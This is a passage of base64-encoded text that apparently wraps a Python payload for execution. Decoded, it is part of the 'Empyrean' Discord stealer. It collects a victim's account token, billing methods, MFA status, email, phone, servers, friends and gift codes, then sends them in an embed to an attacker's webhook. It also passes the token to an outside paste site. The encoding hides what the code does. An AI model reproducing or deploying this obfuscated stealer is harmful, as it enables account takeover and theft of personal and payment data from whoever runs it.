2aXRlID0gZiJodHRwczovL2Rpc2NvcmQuZ2cve2ludml0ZXNbMF1bJ2NvZGUnXX0iDQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGludml0ZSA9ICJodHRwczovL3lvdXR1LmJlL2RRdzR3OVdnWGNRIg0KDQogICAgICAgICAgICAgICAgICAgICAgICBocV9ndWlsZHMuYXBwZW5kKGYiXHUyMDBiXG4qKntndWlsZFsnbmFtZSddfSAoe2d1aWxkWydpZCddfSkqKiBcbiBPd25lcjogYHtvd25lcn1gIHwgTWVtYmVyczogYCDimqsge2d1aWxkWydhcHByb3hpbWF0ZV9tZW1iZXJfY291bnQnXX0gLyDwn5+iIHtndWlsZFsnYXBwcm94aW1hdGVfcHJlc2VuY2VfY291bnQnXX0gLyDwn5S0IHtndWlsZFsnYXBwcm94aW1hdGVfbWVtYmVyX2NvdW50J10gLSBndWlsZFsnYXBwcm94aW1hdGVfcHJlc2VuY2VfY291bnQnXX0gYFxuW0pvaW4gU2VydmVyXSh7aW52aXRlfSkiKQ0KDQogICAgICAgICAgICAgICAgaWYgbGVuKGhxX2d1aWxkcykgPiAwOg0KICAgICAgICAgICAgICAgICAgICBocV9ndWlsZHMgPSAnXG4nLmpvaW4oaHFfZ3VpbGRzKQ0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgICAgIGhxX2d1aWxkcyA9IE5vbmUNCg0KICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICBocV9ndWlsZHMgPSBOb25lDQoNCiAgICAgICAgICAgIGlmIGZyaWVuZHM6DQogICAgICAgICAgICAgICAgaHFfZnJpZW5kcyA9IFtdDQogICAgICAgICAgICAgICAgZm9yIGZyaWVuZCBpbiBmcmllbmRzOg0KICAgICAgICAgICAgICAgICAgICB1bnByZWZlcmVkX2ZsYWdzID0gWzY0LCAxMjgsIDI1NiwgMTA0ODcwNF0NCiAgICAgICAgICAgICAgICAgICAgaW5kcyA9IFtmbGFnWzFdIGZvciBmbGFnIGluIHNlbGYuY2FsY19mbGFncygNCiAgICAgICAgICAgICAgICAgICAgICAgIGZyaWVuZFsndXNlciddWydwdWJsaWNfZmxhZ3MnXSlbOjotMV1dDQogICAgICAgICAgICAgICAgICAgIGZvciBmbGFnIGluIHVucHJlZmVyZWRfZmxhZ3M6DQogICAgICAgICAgICAgICAgICAgICAgICBpbmRzLnJlbW92ZShmbGFnKSBpZiBmbGFnIGluIGluZHMgZWxzZSBOb25lDQogICAgICAgICAgICAgICAgICAgIGlmIGluZHMgIT0gW106DQogICAgICAgICAgICAgICAgICAgICAgICBocV9iYWRnZXMgPSAnICcuam9pbihbZmxhZ1swXSBmb3IgZmxhZyBpbiBzZWxmLmNhbGNfZmxhZ3MoDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZnJpZW5kWyd1c2VyJ11bJ3B1YmxpY19mbGFncyddKVs6Oi0xXV0pDQogICAgICAgICAgICAgICAgICAgICAgICBocV9mcmllbmRzLmFwcGVuZChmJ3tocV9iYWRnZXN9IC0gYHtmcmllbmRbInVzZXIiXVsidXNlcm5hbWUiXX0je2ZyaWVuZFsidXNlciJdWyJkaXNjcmltaW5hdG9yIl19ICh7ZnJpZW5kWyJ1c2VyIl1bImlkIl19KWAnKSAgDQoNCiAgICAgICAgICAgICAgICBpZiBsZW4oaHFfZnJpZW5kcykgPiAwOg0KICAgICAgICAgICAgICAgICAgICBocV9mcmllbmRzID0gJ1xuJy5qb2luKGhxX2ZyaWVuZHMpDQoNCiAgICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgICAgICBocV9mcmllbmRzID0gTm9uZQ0KDQogICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgIGhxX2ZyaWVuZHMgPSBOb25lDQogICAgICAgICAgICANCiAgICAgICAgICAgIGlmIGdpZnRfY29kZXM6DQogICAgICAgICAgICAgICAgY29kZXMgPSBbXQ0KICAgICAgICAgICAgICAgIGZvciBjb2RlIGluIGdpZnRfY29kZXM6DQogICAgICAgICAgICAgICAgICAgIG5hbWUgPSBjb2RlWydwcm9tb3Rpb24nXVsnb3V0Ym91bmRfdGl0bGUnXQ0KICAgICAgICAgICAgICAgICAgICBjb2RlID0gY29kZVsnY29kZSddDQoNCiAgICAgICAgICAgICAgICAgICAgY29kZXMuYXBwZW5kKGYiOmdpZnQ6IGB7bmFtZX1gXG46dGlja2V0OiBge2NvZGV9YCIpDQoNCiAgICAgICAgICAgICAgICBpZiBsZW4oY29kZXMpID4gMDoNCiAgICAgICAgICAgICAgICAgICAgY29kZXMgPSAnXG5cbicuam9pbihjb2RlcykNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgICAgICBjb2RlcyA9IE5vbmUNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICBjb2RlcyA9IE5vbmUNCg0KICAgICAgICAgICAgZW1iZWQgPSBFbWJlZCh0aXRsZT1mInt1c2VybmFtZX0gKHt1c2VyX2lkfSkiLCBjb2xvcj0weDAwMDAwMCkNCiAgICAgICAgICAgIGVtYmVkLnNldF90aHVtYm5haWwodXJsPWF2YXRhcikNCg0KICAgICAgICAgICAgZW1iZWQuYWRkX2ZpZWxkKG5hbWU9IjxhOnBpbmtjcm93bjo5OTYwMDQyMDk2NjczNDY0NDI+IFRva2VuOiIsIHZhbHVlPWYiYGBge3Rva2VufWBgYFxuW0NsaWNrIHRvIGNvcHkhXShodHRwczovL3Bhc3RlLXBncGoub25yZW5kZXIuY29tLz9wPXt0b2tlbn0pXG5cdTIwMGIiLCBpbmxpbmU9RmFsc2UpDQogICAgICAgICAgICBlbWJlZC5hZGRfZmllbGQobmFtZT0iPGE6bml0cm9ib29zdDo5OTYwMDQyMTMzNTQxMzk2NTg+IE5pdHJvOiIsIHZhbHVlPWYie25pdHJvfSIsIGlubGluZT1UcnVlKQ0KICAgICAgICAgICAgZW1iZWQuYWRkX2ZpZWxkKG5hbWU9IjxhOnJlZGJvb3N0Ojk5NjAwNDIzMDM0NTI4MTU0Nj4gQmFkZ2VzOiIsIHZhbHVlPWYie2JhZGdlcyBpZiBiYWRnZXMgIT0gJycgZWxzZSAnTm9uZSd9IiwgaW5saW5lPVRydWUpDQogICAgICAgICAgICBlbWJlZC5hZGRfZmllbGQobmFtZT0iPGE6cGlua2x2Ojk5NjAwNDIyMjA5MDg5MTM2Nj4gQmlsbGluZzoiLCB2YWx1ZT1mIntwYXltZW50X21ldGhvZHMgaWYgcGF5bWVudF9tZXRob2RzICE9ICcnIGVsc2UgJ05vbmUnfSIsIGlubGluZT1UcnVlKQ0KICAgICAgICAgICAgZW1iZWQuYWRkX2ZpZWxkKG5hbWU9Ijw6bWZhOjEwMjE2MDQ5MTY1Mzc2MDIwODg+IE1GQToiLCB2YWx1ZT1mInttZmF9IiwgaW5saW5lPVRydWUpDQoNCiAgICAgICAgICAgIGVtYmVkLmFkZF9maWVsZChuYW1lPSJcdTIwMGIiLCB2YWx1ZT0iXHUyMDBiIiwgaW5saW5lPUZhbHNlKQ0KICAgICAgICAgICAgDQogICAgICAgICAgICBlbWJlZC5hZGRfZmllbGQobmFtZT0iPGE6cmFpbmJvd2hlYXJ0Ojk5NjAwNDIyNjA5MjI0NTA3Mj4gRW1haWw6IiwgdmFsdWU9ZiJ7ZW1haWwgaWYgZW1haWwgIT0gTm9uZSBlbHNlICdOb25lJ30iLCBpbmxpbmU9VHJ1ZSkNCiAgICAgICAgICAgIGVtYmVkLmFkZF9maWVsZChuYW1lPSI8OnN0YXJ4Z2xvdzo5OTYwMDQyMTc2OTk0MzQ0OTY+IFBob25lOiIsIHZhbHVlPWYie3Bob25lIGlmIHBob25lICE9IE5vbmUgZWxzZSAnTm9uZSd9IiwgaW5saW5lPVRydWUpICAgIA0KDQogICAgICAgICAgICBlbWJlZC5hZGRfZmllbGQobmFtZT0iXHUyMDBiIiwgdmFsdWU9Ilx1MjAwYiIsIGlubGluZT1GYWxzZSkNCg0KICAgICAgICAgICAgaWYgaHFfZ3VpbGRzICE9IE5vbmU6DQogICAgICAgICAgICAgICAgZW1iZWQuYWRkX2ZpZWxkKG5hbWU9IjxhOmVhcnRocGluazo5OTYwMDQyMzY1MzE4NTk1ODg+IEhRIEd1aWxkczoiLCB2YWx1ZT1ocV9ndWlsZHMsIGlubGluZT1GYWxzZSkNCiAgICAgICAgICAgICAgICBlbWJlZC5hZGRfZmllbGQobmFtZT0iXHUyMDBiIiwgdmFsdWU9Ilx1MjAwYiIsIGlubGluZT1GYWxzZSkNCiAgICAgICAgICAgDQogICAgICAgICAgICBpZiBocV9mcmllbmRzICE9IE5vbmU6DQogICAgICAgICAgICAgICAgZW1iZWQuYWRkX2ZpZWxkKG5hbWU9IjxhOmVhcnRocGluazo5OTYwMDQyMzY1MzE4NTk1ODg+IEhRIEZyaWVuZHM6IiwgdmFsdWU9aHFfZnJpZW5kcywgaW5saW5lPUZhbHNlKQ0KICAgICAgICAgICAgICAgIGVtYmVkLmFkZF9maWVsZChuYW1lPSJcdTIwMGIiLCB2YWx1ZT0iXHUyMDBiIiwgaW5saW5lPUZhbHNlKQ0KDQogICAgICAgICAgICBpZiBjb2RlcyAhPSBOb25lOg0KICAgICAgICAgICAgICAgIGVtYmVkLmFkZF9maWVsZChuYW1lPSI8YTpnaWZ0OjEwMjE2MDg0Nzk4MDg1Njk0MzU+IEdpZnQgQ29kZXM6IiwgdmFsdWU9Y29kZXMsIGlubGluZT1GYWxzZSkNCiAgICAgICAgICAgICAgICBlbWJlZC5hZGRfZmllbGQobmFtZT0iXHUyMDBiIiwgdmFsdWU9Ilx1MjAwYiIsIGlubGluZT1GYWxzZSkNCg0KICAgICAgICAgICAgZW1iZWQuc2V0X2Zvb3Rlcih0ZXh0PSJnaXRodWIuY29tL2FkZGkwMDAwMC9lbXB5cmVhbiIpDQoNCiAgICAgICAgICAgIHNlbGYud2ViaG9vay5zZW5kKGVtYmVkPWVtYmVkLCB1c2VybmFtZT0iRW1weXJlYW4iLCBhdmF0YXJfdXJsPSJodHRwczovL2kuaW1ndXIuY29tL0hqemZqZlIucG5nIikNCg=="))
